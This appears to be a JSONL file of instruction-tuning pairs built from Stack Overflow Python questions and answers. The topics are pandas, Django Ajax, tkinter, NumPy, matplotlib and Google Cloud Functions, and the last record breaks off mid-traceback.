{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Fastest way to convert huge dictionary to a dataframe<p>I have a dictionary that looks like this:<\/p>\n<pre><code>dict = {A: {A: 0,\n  B: 1,\n  C: 1,\n  D: 2,\n  E: 2,\n  F: 2,\n  G: 2,\n  H: 2,\n  I: 3},\n B: {B: 0,\n  A: 1,\n  K: 1,\n  O: 1,\n  M: 1,\n  Q: 1,\n  L: 1,\n  Z: 2,\n  T: 2},\n C: {C: 0,\n  R: 1,\n  A: 1,\n  D: 2,\n  F: 2,\n  J: 2,\n  E: 2,\n  Y: 2,\n  B: 2},\n D: {D: 0,\n  F: 1,\n  H: 1,\n  I: 1,\n  E: 1,\n  A: 2,\n  C: 2,\n  S: 2,\n  U: 3}\n<\/code><\/pre>\n<p>But in fact it is way bigger (up to 60K keys) and I need a very fast and efficient way to turn this dictionary into a dataframe that looks like this:<\/p>\n<pre><code>person_1     person_2    degree\n   A            A          0\n   A            B          1 \n   A            C          1\n   A            D          2\n   A            E          2 \n   A            F          2\n   A            G          2\n   A            H          2 \n   A            I          3\n   B            B          0\n   B            A          1 \n   B            K          1 \n   B            O          1\n   B            M          1 \n   B            Q          1 \n   B            L          1\n   B            Z          2 \n   B            T          2 \n   C            C          0\n   C            R          1 \n   C            A          1 \n   C            D          2\n   C            F          2 \n   C            J          2 \n   C            E          2\n   C            Y          2 \n   C            B          2\n   D            D          0\n   D            F          1 \n   D            H          1 \n   D            I          1\n   D            E          1 \n   D            A          2 \n   D            C          2\n   D            S          2 \n   D            U          3\n<\/code><\/pre>\n<p>So basically I need a dataframe where each comes from the dictionary keys and their values, and the third column is the number inside that key. What I'm doing right now is to convert the dictionary to df using <code>df = pd.DataFrame(dict)<\/code> and then<\/p>\n<pre><code>df = pd.melt(df, 'index').rename(columns = {'index': 'hcp_npi', \n                                            'variable':'connected_hcp_npi', \n                                            'value': 'degree_of_separation'}).dropna()\n<\/code><\/pre>\n<p>And I get the result I need. But the problem with this approach is that when the dictionary exceeds 20K keys, the melt function just takes forever to run. So I'm looking a faster or more efficient way to go from the initial dictionary to the last dataframe.<\/p>\n<p>Thanks!<\/p>","output_text":"<p>It looks like it's faster to pre-process the dictionary into the column values:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from collections import defaultdict\n\nd2 = defaultdict(list)\nfor k, v in d.items():\n    d2['person_1'] += [k] * len(v)\n    d2['person_2'] += list(v.keys())\n    d2['degree'] += list(v.values())\n\ndf = pd.DataFrame(d2)\n<\/code><\/pre>\n<p>I tested your method, @jezrael, @BENYs (now deleted) and mine using <code>timeit<\/code> and code like this (replacing the <code>stmt<\/code> as appropriate):<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>timeit.timeit(setup='''\nimport pandas as pd\nd = {'A': {'A': 0, 'B': 1, 'C': 1, 'D': 2, 'E': 2, 'F': 2, 'G': 2, 'H': 2, 'I': 3},\n 'B': {'B': 0, 'A': 1, 'K': 1, 'O': 1, 'M': 1, 'Q': 1, 'L': 1, 'Z': 2, 'T': 2},\n 'C': {'C': 0, 'R': 1, 'A': 1, 'D': 2, 'F': 2, 'J': 2, 'E': 2, 'Y': 2, 'B': 2},\n 'D': {'D': 0, 'F': 1, 'H': 1, 'I': 1, 'E': 1, 'A': 2, 'C': 2, 'S': 2, 'U': 3}\n }\n''',\nstmt='''\ndf = pd.DataFrame(d)\ndf = pd.melt(df).rename(columns = {'index': 'hcp_npi', \n                                            'variable':'connected_hcp_npi', \n                                            'value': 'degree_of_separation'}).dropna()\n''',\nnumber=1000)\n<\/code><\/pre>\n<p>For 1000 iterations, the results were:<\/p>\n<pre><code>Nick      0.2878\njezrael   0.3178\nBENY      2.2822\nTomasCB   2.2774\n<\/code><\/pre>\n<p>For reference, I include @BENY answer here:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>pd.concat({x : pd.Series(y) for x , y in d.items()}).reset_index()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Adding Ajax to comments section not Working<p>I am trying to add Ajax to my comment section to avoid the page refreshing every time a comment is added.<\/p>\n<p>So I load the comments section to the post-details.html from new comments.html and followed the implementing Ajax to posts but my problem is that it is not making any effect and the page needs to refresh to show the new comment<\/p>\n<p>I have sub-classed Generic DetailView class in views.py and trying to figure out a way to return data in JSON format based on an argument received in the URL. Here's what I have tried doing:<\/p>\n<pre><code>class PostDetailView(DetailView):\n    model = Post\n    template_name = &quot;blog\/post_detail.html&quot;  # &lt;app&gt;\/&lt;model&gt;_&lt;viewtype&gt;.html\n\n    def get_context_data(self, *args, **kwargs):\n        context = super(PostDetailView, self).get_context_data()\n        post = get_object_or_404(Post, slug=self.kwargs['slug'])\n        comments = Comment.objects.filter(\n            post=post).order_by('-id')\n        total_likes = post.total_likes()\n        liked = False\n        if post.likes.filter(id=self.request.user.id).exists():\n            liked = True\n\n        if self.request.method == 'POST':\n            comment_form = CommentForm(self.request.POST or None)\n            if comment_form.is_valid():\n                content = self.request.POST.get('content')\n                comment_qs = None\n\n                comment = Comment.objects.create(\n                    post=post, user=self.request.user, content=content)\n                comment.save()\n                return HttpResponseRedirect(&quot;blog\/post_detail.html&quot;)\n        else:\n            comment_form = CommentForm()\n\n        context[&quot;comments&quot;] = comments\n        context[&quot;comment_form&quot;] = comment_form\n        context[&quot;total_likes&quot;] = total_likes\n        context[&quot;liked&quot;] = liked\n\n        if self.request.is_ajax():\n            html = render_to_string('blog\/comments.html', context, request=self.request)\n            return JsonResponse({'form': html})\n        else:\n            return context\n<\/code><\/pre>\n<p>But this gave me TypeError as it should be:<\/p>\n<pre><code>TypeError: context must be a dict rather than JsonResponse.\n<\/code><\/pre>\n<p>Here is the traceback:<\/p>\n<pre><code>Traceback (most recent call last):\n  File &quot;C:\\Users\\User\\Desktop\\Project\\venv\\lib\\site-packages\\django\\core\\handlers\\exception.py&quot;, line 47, in inner\n    response = get_response(request)\n  File &quot;C:\\Users\\User\\Desktop\\Project\\venv\\lib\\site-packages\\django\\core\\handlers\\base.py&quot;, line 202, in _get_response\n    response = response.render()\n  File &quot;C:\\Users\\User\\Desktop\\Project\\venv\\lib\\site-packages\\django\\template\\response.py&quot;, line 105, in render\n    self.content = self.rendered_content\n  File &quot;C:\\Users\\User\\Desktop\\Project\\venv\\lib\\site-packages\\django\\template\\response.py&quot;, line 83, in rendered_content\n    return template.render(context, self._request)\n  File &quot;C:\\Users\\User\\Desktop\\Project\\venv\\lib\\site-packages\\django\\template\\backends\\django.py&quot;, line 59, in render\n    context = make_context(context, request, autoescape=self.backend.engine.autoescape)\n  File &quot;C:\\Users\\User\\Desktop\\Project\\venv\\lib\\site-packages\\django\\template\\context.py&quot;, line 268, in make_context\n    raise TypeError('context must be a dict rather than %s.' % context.__class__.__name__)\n<\/code><\/pre>\n<p>In the console I am receiving this error:<\/p>\n<pre><code>GET http:\/\/127.0.0.1:8000\/blog\/blog-4\/ 500 (Internal Server Error)  jquery.min.js:2 \n<\/code><\/pre>\n<p>Here is the comment section:<\/p>\n<pre><code>        &lt;!-- Submit Comment --&gt;\n        &lt;div class=&quot;container-fluid mt-2&quot;&gt;\n            &lt;div class=&quot;form-group row&quot;&gt;\n                &lt;form action=&quot;{% url 'blog:post-comment' post.slug %}&quot; method=&quot;post&quot; class=&quot;comment-form&quot; action=&quot;.&quot;&gt;\n                {% csrf_token %}\n                {{ comment_form.as_p }}\n                &lt;input type=&quot;submit&quot; name=&quot;post_id&quot; value='Submit' class=&quot;btn btn-outline-success&quot;&gt;\n&lt;!--                &lt;button type=&quot;submit&quot; class=&quot;btn btn-outline-success&quot;&gt;Submit&lt;\/button&gt;--&gt;\n                &lt;\/form&gt;\n            &lt;\/div&gt;\n        &lt;\/div&gt;\n        &lt;!-- Submit Comment --&gt;\n\n        &lt;!-- Show Comment --&gt;\n        &lt;button class=&quot;cmt_btn btn btn-outline-info mb-0&quot;&gt;Show \/ Hide {{comments.count}} Comment{{comments|pluralize}}&lt;\/button&gt;\n            &lt;div class=&quot;comment-box&quot;&gt;\n            {% for comment in comments %}\n                &lt;ul class=&quot;mt-3 list-unstyled&quot;&gt;\n                  &lt;li class=&quot;media&quot;&gt;\n                    &lt;img class=&quot;rounded-circle article-img&quot; src=&quot;{{ comment.post.author.profile.image.url }}&quot;&gt;\n                      &lt;div class=&quot;media-body&quot;&gt;\n                      &lt;h5 class=&quot;mt-0 mb-1&quot;&gt;{{comment.user| capfirst}}&lt;small class=&quot;text-muted&quot;&gt;- {{ comment.created}}&lt;\/small&gt; &lt;\/h5&gt;\n                        &lt;hr class=&quot;solid mt-0&quot;&gt;\n                         {% if comment.user == user %}\n                          &lt;div&gt;\n                            &lt;a class=&quot;float-right mr-3&quot; href=&quot;{% url 'blog:delete-comment' comment.id%}&quot;&gt;Delete &lt;\/a&gt;\n                          &lt;\/div&gt;\n                        {% endif %}\n                        {{ comment.content}}\n                      &lt;\/div&gt;\n                  &lt;\/li&gt;\n                &lt;\/ul&gt;\n            {% endfor %}\n            &lt;\/div&gt;\n        &lt;!-- Show Comment --&gt;\n<\/code><\/pre>\n<p>Here is the scripts<\/p>\n<pre><code>    &lt;script&gt;\n        $(document).on('submit', '.comment-form', function(event){\n          event.preventDefault();\n          console.log($(this).serialize());\n          $.ajax({\n            type: 'POST',\n            url: $(this).attr('action'),\n            data: $(this).serialize(),\n            dataType: 'json',\n            success: function(response) {\n              $('.main-comment-section').html(response['form']);\n              $('textarea').val('');\n            },\n            error: function(rs, e) {\n              console.log(rs.responseText);\n            },\n          });\n        });\n    &lt;\/script&gt;\n<\/code><\/pre>\n<p>My question is:<\/p>\n<p>What is the reason for getting this error and how do I fix it?<\/p>","output_text":"<p>The function <code>get_context_data<\/code> is only for building data for the context not handling an ajax request. You need to split your function to provide handling for GET data<\/p>\n<p><em>Example Structure<\/em><\/p>\n<pre class=\"lang-py prettyprint-override\"><code>class PostDetailView(DetailView):\n    model = Post\n    template_name = &quot;blog\/post_detail.html&quot;  # &lt;app&gt;\/&lt;model&gt;_&lt;viewtype&gt;.html\n\n    def get_context_data(self, *args, **kwargs):\n        [...]\n        return context\n\n    def get(self, request, *args, **kwargs):\n        if self.request.is_ajax():\n            context = self.get_context_data(self, *args, **kwargs)\n            html = render_to_string('blog\/comments.html', context, request=self.request)\n            return JsonResponse({'form': html})\n        [...]\n    \n    def post(self, request, *args, **kwargs):\n        [...]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n draw a line between 2 checkbuttons chosen with mouse click in python<p>I have a code to paste checkbuttons in a canvas. They also change colors if clicked. If I click another checkbutton that is set up from the beginning, I want to be able to draw a line between 2 checkbuttons I select with the mouse click. Also I need the line to change the color when I click the first checkbutton. Any suggestion how to do it? <a href=\"https:\/\/i.stack.imgur.com\/IA6Ka.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/IA6Ka.png\" alt=\"line should be straight\" \/><\/a><\/p>\n<pre><code>    from tkinter import *\n\nroot = Tk()\n\nbuttons = []\n\nclass CMD: #Auxilliary function for callbacks using parameters. Syntax: CMD(function, argument1, argument2, ...)\n    def __init__(s1, func, *args):\n        s1.func = func\n        s1.args = args\n    def __call__(s1, *args):\n        args = s1.args+args\n        s1.func(*args)\n\n def color_checkbutton(pos=0):  # define the colors of the checkbutton\n    if buttons[pos][0].get() == 1:\n        buttons[pos][2].configure(bg='red')\n    else:\n        buttons[pos][2].configure(bg='green')\n\ndef place_checkbutton_in_canvas(e):  # order to insert the checkbutton\n    if len(str(e.widget))&lt;3: ## Don't place a new one if a checkbox was clicked\n        b = IntVar()\n        pos = len(buttons)\n        xx_and = e.x\n        yy_and = e.y\n        buttons.append([b,pos, Checkbutton(root, variable=b, textvariable=b, command=CMD(color_checkbutton,pos))])\n        buttons[-1][2].place(x=xx_and, y=yy_and)\n        color_checkbutton(pos)\n\nroot.bind('&lt;Button-1&gt;', place_checkbutton_in_canvas)\n\nline = IntVar()\ndraw_line_check = Checkbutton(root, variable=line)\ndraw_line_check.place(x=30,y=100)\n\nroot.mainloop()\n<\/code><\/pre>","output_text":"<p>You would need a lot more code and you are not even close in my opinion.<\/p>\n<p>Most importantly you dont have the checkbuttons <strong>IN<\/strong> your <em>canvas<\/em>, you have your Checkbuttons <strong>above<\/strong> the Canvas, if you dont use somewhere <code>create_window<\/code> in put them in(even though in your code isnt a canvas yet). But you will like to have them in the Canvas to use the <a href=\"https:\/\/stackoverflow.com\/questions\/62712481\/tkinter-why-is-there-such-a-thing-like-bbox\/62716053#62716053\">bbox method<\/a> of the canvas later.<\/p>\n<p>The next thing is how you try to save your data, with more checkbuttons it get more complex. May think about a <a href=\"https:\/\/stackoverflow.com\/a\/5900634\/13629335\">defaultdict<\/a>, or even better define a <code>class(object)<\/code> where you can target them easier and define class functions for the behavior.<\/p>\n<pre><code>draw_line_check = Checkbutton(root, variable=line)\n<\/code><\/pre>\n<p>The above line will need a command where you will bind your <code>Button-1<\/code> to another behavior if clicked and vice versa.<\/p>\n<p>So I would do it like this:<\/p>\n<ol>\n<li>define a class that will place a Checkbutton on your Canvas and behave what ever you like.<\/li>\n<li>keep track of your instances somewhere in the global namespace with a defaultdict<\/li>\n<li>define a function that creates instances of your class.<\/li>\n<li>write a function that rebinds your <code>Button-1<\/code><\/li>\n<\/ol>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n +\/- viewer initialisation in fipy with try, except over simply initializing it<p>In the example from the <a href=\"https:\/\/www.ctcms.nist.gov\/fipy\/examples\/diffusion\/generated\/examples.diffusion.circle.html#module-examples.diffusion.circle\" rel=\"nofollow noreferrer\">fipy documentation<\/a> the following code is used to \"create a Viewer to see the mesh\":<\/p>\n\n<pre><code>viewer = None\nif __name__ == '__main__':\n    try:\n        viewer = Viewer(vars=phi, datamin=-1, datamax=1.)\n        viewer.plotMesh()\n        input(\"Irregular circular mesh. Press &lt;return&gt; to proceed...\") # doctest: +GMSH\n    except:\n        print(\"Unable to create a viewer for an irregular mesh (try Matplotlib2DViewer or MayaviViewer)\"\n<\/code><\/pre>\n\n<p>Could someone explain to me why this way is chosen over the simplified version of:<\/p>\n\n<pre><code>viewer = Viewer(vars=T, datamin=T0, datamax=Tu)\nviewer.plotMesh()\ninput(\"Irregular circular mesh. Press &lt;return&gt; to proceed\")\n<\/code><\/pre>\n\n<p>I guess it links to the question if the code is in the main program or if things got imported but i do not quite understand the advantage\/disadvantage yet and would appreciate to clarify someone helping me:)<\/p>","output_text":"<p>No good reason. That bit was originally (14 years ago) hard-coded to use a particular plotting library which, at the time, was the only one capable of displaying irregular meshes. We didn't want the example to fall over just because that particular plotting library wasn't installed.<\/p>\n\n<p>That restriction is no longer true and, in fact, we don't even support that plotting library anymore, but we never noticed that the <code>try-except<\/code> was no longer needed as the code got revised over the years.<\/p>\n\n<p>Thanks for reporting this issue (<a href=\"https:\/\/github.com\/usnistgov\/fipy\/issues\/688\" rel=\"nofollow noreferrer\">#688<\/a>).<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Convert selected dataframe columns to vector representation (including duplicate values)<p>I have the below dataframe (product.csv) which I want to convert to vector representation:<\/p>\n<pre><code>product_id,value\n111,3000\n121,2500\n131,3500\n141,1000\n111,3300\n151,2000\n161,2300\n171,1300\n181,1500\n191,4500\n121,6000\n121,1100\n<\/code><\/pre>\n<p>My expected output should include all rows including duplicate product_ids and be in a vector form exactly as below:<\/p>\n<p><strong>[111:3000; 121:2500; 131:3500; 141:1000; 111:3300; 151:2000; 161:2300; 171:1300; 181:1500; 191:4500; 121:6000; 121:1100]<\/strong><\/p>\n<p>This is what I have tried so far:<\/p>\n<pre><code>import pandas as pd\n\ndf = pd.read_csv('product.csv') #, index_col=0, sep=','\n\nmy_dict_indx = df.set_index('product_id')['value'].to_dict()\nprint(my_dict_indx)\n\nmy_dict_zip = dict(zip(df.product_id, df.value))\nprint(my_dict_zip)\n\nmy_dict_groupby = df.groupby(level=0).apply(lambda x: x.to_dict('r')).to_dict()\nprint(my_dict_groupby)\n<\/code><\/pre>\n<p>However, both <code>my_dict_indx = df.set_index('product_id')['value'].to_dict()<\/code> and <code>my_dict_zip = dict(zip(df.product_id, df.value))<\/code> give me the below output but exclude duplicate product_ids 111 and 121, do not return the correct order (e.g., output starts with 161:2300 instead of 111:3000):<\/p>\n<blockquote>\n<p>{161: 2300, 131: 3500, 171: 1300, 141: 1000, 111: 3300, 181: 1500,\n151: 2000, 121: 1100, 191: 4500}<\/p>\n<\/blockquote>\n<p>On the other hand <code>my_dict_groupby = df.groupby(level=0).apply(lambda x: x.to_dict('r')).to_dict()<\/code> gives me the correct number of records and correct sequence below but includes unnecessary column indices, column names, and with no vector representation.<\/p>\n<blockquote>\n<p>{0: [{'product_id': 111, 'value': 3000}], 1: [{'product_id': 121,\n'value': 2500}], 2: [{'product_id': 131, 'value': 3500}], 3:\n[{'product_id': 141, 'value': 1000}], 4: [{'product_id': 111, 'value':\n3300}], 5: [{'product_id': 151, 'value': 2000}], 6: [{'product_id':\n161, 'value': 2300}], 7: [{'product_id': 171, 'value': 1300}], 8:\n[{'product_id': 181, 'value': 1500}], 9: [{'product_id': 191, 'value':\n4500}], 10: [{'product_id': 121, 'value': 6000}], 11: [{'product_id':\n121, 'value': 1100}]}<\/p>\n<\/blockquote>\n<p>How can I enhance my solution to achieve my expected output in [] vector form instead of {} dictionary form. Thanks in advance.<\/p>","output_text":"<p>I would create an the array of strings, because it's only way to support the output format you desire. Then you can simply use <code>.values<\/code> to get the column\/array from the pandas series<\/p>\n<pre><code>df['output_col'] = (df['product_id'].astype(str) + ':' + df['value'].astype(str)).values\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>array(['111:3000', '121:2500', '131:3500', '141:1000', '111:3300',\n       '151:2000', '161:2300', '171:1300', '181:1500', '191:4500',\n       '121:6000', '121:1100'], dtype=object)\n<\/code><\/pre>\n<p>If you wish to have it as a list instead of an array, simply add <code>.tolist()<\/code> after the <code>.values<\/code> method. Finally, keep in mind that in Python a <code>,<\/code> is used to separate elements in an array\/list instead of <code>;<\/code><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Numerical differences in NumPy conjugate and angle<p>Suppose to have two complex numbers using Python and NumPy (1.20.1):<\/p>\n<pre><code>a = 5 + 1j*3\na0 = 4 + 1j*2\n<\/code><\/pre>\n<p>And I want to calculate the phase shift, aka the distance between the two angles. I am getting two slightly different results:<\/p>\n<pre><code>&gt;&gt;&gt; np.angle(a*np.conjugate(a0))\n0.07677189126977804\n&gt;&gt;&gt; np.angle(a) - np.angle(a0)\n0.07677189126977807\n<\/code><\/pre>\n<p>I guess the most correct way should be the first.\nIn some cases the difference is bigger, in others there is none.<\/p>\n<p>Does anyone know the origin of this difference?<\/p>\n<p>Cheers.<\/p>\n<p><strong>EDIT<\/strong>\nI've found a more relevant example:<\/p>\n<pre><code>&gt;&gt;&gt; a = 41.887609743111966+3.868827773225067j\n&gt;&gt;&gt; a0 = -65.06495257694792-0.19335140606773393j\n&gt;&gt;&gt; np.angle(a) - np.angle(a0)\n3.2307217955357035\n&gt;&gt;&gt; np.angle(a*np.conjugate(a0))\n-3.0524635116438827\n<\/code><\/pre>","output_text":"<p>The first example is just due to numerical imprecision inherent in doing floating point calculations; performing these operations in different order leads to different round offs that result in them being represented by (very slightly) different floating point values. The difference in value between the two is negligible for most applications.<\/p>\n<p>However, as your second example shows, these two expressions are not equivalent. <code>np.angle<\/code> returns a value from -pi to pi, which is important when the difference in angle is larger than than that. When you take a difference between two angles, you can get a value outside this range, which is what happens in the first snippet. The second snippet where the result comes directly from <code>np.angle<\/code> has to be in the range -pi to pi. The difference between these your two results is simply 2pi.<\/p>\n<p>So if you wanted to determine the absolute angle between two points, you would use your first formula. If you just wanted to determine the relative phase between -pi and pi, you would use the second.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n matplotlib: Second empty window on plt.show()<p>I usually don't ask questions on this platform, but I have a problem that quite bugs me.<\/p>\n<p><strong>Context<\/strong><\/p>\n<p>I have a function that plots data from a dataframe that has stockdata. It all works perfectly except for the fact that a second, empty window shows next to the actual graph whenever I execute this function. <a href=\"https:\/\/i.stack.imgur.com\/YGcw8.png\" rel=\"nofollow noreferrer\">(image)<\/a><\/p>\n<p>Here is all the relevant code, I'd be very grateful if some smart people could help me.<\/p>\n<pre><code>    def plot(self):\n    plt.clf()\n    plt.cla()\n    colors = Colors()\n    data = self.getStockData()\n    if data.empty:\n        return\n    data.index = [TimeData.fromTimestamp(x) for x in data.index]\n    current, previous = data.iloc[-1, 1], data.iloc[0, 1]\n    percentage = (current \/ previous - 1) * 100\n    # Create a table\n    color = colors.decideColorPct(percentage)\n    # Create the table\n    fig = plt.figure(edgecolor=colors.NEUTRAL_COLOR)\n    fig.patch.set_facecolor(colors.BACKGROUND_COLOR)\n    plt.plot(data.close, color=color)\n    plt.title(self.__str2__(), color=colors.NEUTRAL_COLOR)\n    plt.ylabel(&quot;Share price in $&quot;, color=colors.NEUTRAL_COLOR)\n    plt.xlabel(&quot;Date&quot;, color=colors.NEUTRAL_COLOR)\n    ax = plt.gca()\n\n    ax.xaxis.set_major_formatter(plt_dates.DateFormatter('%Y\/%m\/%d %H:%M'))\n    ax.set_xticks([data.index[0], data.index[-1]])\n    ax.set_facecolor(colors.BACKGROUND_COLOR)\n    ax.tick_params(color=colors.NEUTRAL_COLOR, labelcolor=colors.NEUTRAL_COLOR)\n    for spine in ax.spines.values():\n        spine.set_edgecolor(colors.NEUTRAL_COLOR)\n\n    ax.yaxis.grid(True, color=colors.NEUTRAL_COLOR, linestyle=(0, (5, 10)), linewidth=.5)\n    plt.show()\n<\/code><\/pre>\n<p><strong>Some notes:<\/strong><\/p>\n<p>Matplotlib never gets used in the program before this.<\/p>\n<p>The data is standardized and consists of the following columns: open, low, high, close, volume.<\/p>\n<p>The index of the dataframe exists of timestamps, which gets converted to an index of datetime objects at the following line: <code>data.index = [TimeData.fromTimestamp(x) for x in data.index]<\/code><\/p>","output_text":"<p>Remove <code>plt.clf()<\/code> and <code>plt.cla()<\/code> because it automatically creates window for plot when you don't have this window.<\/p>\n<p>And later <code>fig = plt.figure()<\/code> creates new window which it uses to display your plot.<\/p>\n<hr \/>\n<p>Minimal code for test<\/p>\n<pre><code>import matplotlib.pyplot as plt\nimport pandas as pd\n\ndata = pd.DataFrame({'x': [1,2,3], 'y': [2,3,1]})\n\n#plt.clf()\n#plt.cla()\nfig = plt.figure()\nplt.plot(data)\nax = plt.gca()\nplt.show()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n and statement using string not working (Python3)<p>I'm adding each line from a file to a list and everything is working fine up until I check to see that the line contains \"@\" and \":\" <code>if \"@\" and \":\" in line:<\/code>. Logically it should work but it seems to be checking the only first item which is \"@\". If i put \":\" first then it only check that rather than both.<\/p>\n\n<pre><code>email_list = []\nwith open(f\"{file_path}\/test.txt\", \"r\") as file:\n    for line in file:\n        line = line.replace(' ', '')\n        if not any(x in line for x in remove_emails):\n            line = line.strip()\n            if \"@\" and \":\" in line: #This line is not working\n                email_list.append(line)\n<\/code><\/pre>\n\n<p>Expected outcome:<\/p>\n\n<pre><code>if file contains:\nuser_1@domain:123\nuser_2@domain\nuser_3domain:123\n\nOnly user_1@domain:123 should be added to the list as it has both @ and :\n<\/code><\/pre>","output_text":"<pre><code>if \"@\":\n   print(\"Well this is always true\")\n\nif \"@\" and \"X\" in my_string:\n   print(\"found X in my_string... '@' is always true ao maybe its in this string\")\n<\/code><\/pre>\n\n<p>instead you need<\/p>\n\n<pre><code>if \"@\" in my_string and \":\" in my_string:\n   print(\"Both are here!\")\n<\/code><\/pre>\n\n<p>if you have many characters you want to check you could use dawgs suggestion from the comments<\/p>\n\n<pre><code>to_check = \":@\"\nif all(ch in my_string for ch in to_check):\n   print(\"I found all of {0} in my_string\".format(to_check)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n receiving \"TypeError: list indices must be integers or slices, not dict\" when calling a value within a dictionary within a list<p>I have the following code for a silent auction program exercise:<\/p>\n<pre><code>bidding = 1\nentry_dictionary = {}\nentries_list = []\n\nwhile bidding:\n    entry_dictionary = {}\n    name = input(&quot;What is your name?\\n&quot;)\n    bid = int(input(&quot;What's your bid?\\n$&quot;))\n    entry_dictionary[&quot;name&quot;] = name\n    entry_dictionary[&quot;bid&quot;] = bid\n    entries_list.append(entry_dictionary)\n    print(entries_list)\n    other_bidders = input(&quot;Are there any other bidders? Type 'yes' or 'no'\\n&quot;)\n    if other_bidders == &quot;yes&quot;:\n        \n    else:\n        bidding = 0\n       \n<\/code><\/pre>\n<p>The entries_list has the following format:<\/p>\n<pre><code>entries_list = [\n{\n  &quot;name&quot;: &quot;john&quot;, \n  &quot;bid&quot;: 100,\n},\n{\n  &quot;name&quot;: &quot;Laura&quot;,\n  &quot;bid&quot;: 500,\n},\n]\n<\/code><\/pre>\n<p>Printing a value within the <code>entries_list<\/code> works fine:<\/p>\n<pre><code>print(entries_list[0][&quot;bid&quot;])     # output is &quot;100&quot;\n<\/code><\/pre>\n<p>However, when I reference it in an if statement in a for loop:<\/p>\n<pre><code>max_bid = 0\nfor entry in entries_list:\n    if entries_list[entry][&quot;bid&quot;] &gt; max_bid:\n        print(&quot;itworks&quot;)\n<\/code><\/pre>\n<p>I get a <em>TypeError: list indices must be integers or slices, not dict<\/em><\/p>\n<p>any thoughts?<\/p>","output_text":"<p>Since you are already looping the entries_list dict you can just slice on that<\/p>\n<pre><code>for entry in entries_list:\n    if entry[&quot;bid&quot;] &gt; max_bid:\n        print(&quot;it works&quot;)\n<\/code><\/pre>\n<p>should work.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to access csv file from Google Cloud Storage in a Google Cloud Function via Pandas?<p>I'm new to cloud functions, so I followed the default GCP cloud function <a href=\"https:\/\/cloud.google.com\/functions\/docs\/writing\/http#writing_http_helloworld-python\" rel=\"nofollow noreferrer\">&quot;hello world&quot; tutorial<\/a>. It worked fine and printed &quot;hello world&quot; as expected. I only changed the requirements.txt file to include pandas and google-cloud-storage. Likewise, all my edits to the main.py script were in the imports section before the function definition AND in the else section of the function.<\/p>\n<p>requirements.txt<\/p>\n<pre><code>pandas \ngoogle-cloud-storage\n<\/code><\/pre>\n<p>main.py:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import pandas as pd\nfrom google.cloud import storage   \n\ndef hello_world(request):\n    &quot;&quot;&quot;Responds to any HTTP request.\n    Args:\n        request (flask.Request): HTTP request object.\n    Returns:\n        The response text or any set of values that can be turned into a\n        Response object using\n        `make_response &lt;http:\/\/flask.pocoo.org\/docs\/1.0\/api\/#flask.Flask.make_response&gt;`.\n    &quot;&quot;&quot;\n    request_json = request.get_json()\n    if request.args and 'message' in request.args:\n        return request.args.get('message')\n    elif request_json and 'message' in request_json:\n        return request_json['message']\n    else:       \n        storage_client = storage.Client()\n        bucket = storage_client.bucket('my_bucket')\n        model_filename = &quot;my_file.csv&quot;\n        blob = bucket.blob(model_filename)\n        blob.download_to_filename('temp.csv')        \n        with open('temp.csv','rb') as f:\n            df = pd.read_csv(f)\n        \n        return str(df.columns)\n\n<\/code><\/pre>\n<p>When I test the function in GCP's &quot;test cloud function&quot; area, the following errors are captured in the logs. The first 7 lines seem to boilerplate errors while the last two are specific to my actual program. <code>File &quot;\/layers\/google.python.pip\/pip\/lib\/python3.8\/site-packages\/google\/cloud\/storage\/blob.py&quot;, line 1183, in download_to_filename with open(filename, &quot;wb&quot;) as file_obj: OSError: [Errno 30] Read-only file system: 'temp.csv'<\/code>. I have no idea why this error is triggering.<\/p>\n<p>Errors:<\/p>\n<pre><code>Traceback (most recent call last): File &quot;\/layers\/google.python.pip\/pip\/lib\/python3.8\/site-packages\/flask\/app.py&quot;, line 2447, in wsgi_app response = self.full_dispatch_request() \nFile &quot;\/layers\/google.python.pip\/pip\/lib\/python3.8\/site-packages\/flask\/app.py&quot;, line 1952, in full_dispatch_request rv = self.handle_user_exception(e) \nFile &quot;\/layers\/google.python.pip\/pip\/lib\/python3.8\/site-packages\/flask\/app.py&quot;, line 1821, in handle_user_exception reraise(exc_type, exc_value, tb) \nFile &quot;\/layers\/google.python.pip\/pip\/lib\/python3.8\/site-packages\/flask\/_compat.py&quot;, line 39, in reraise raise value \nFile &quot;\/layers\/google.python.pip\/pip\/lib\/python3.8\/site-packages\/flask\/app.py&quot;, line 1950, in full_dispatch_request rv = self.dispatch_request() \nFile &quot;\/layers\/google.python.pip\/pip\/lib\/python3.8\/site-packages\/flask\/app.py&quot;, line 1936, in dispatch_request return self.view_functions[rule.endpoint](**req.view_args) \nFile &quot;\/layers\/google.python.pip\/pip\/lib\/python3.8\/site-packages\/functions_framework\/__init__.py&quot;, line 87, in view_func return function(request._get_current_object()) \nFile &quot;\/workspace\/main.py&quot;, line 25, in hello_world blob.download_to_filename('temp.csv') \nFile 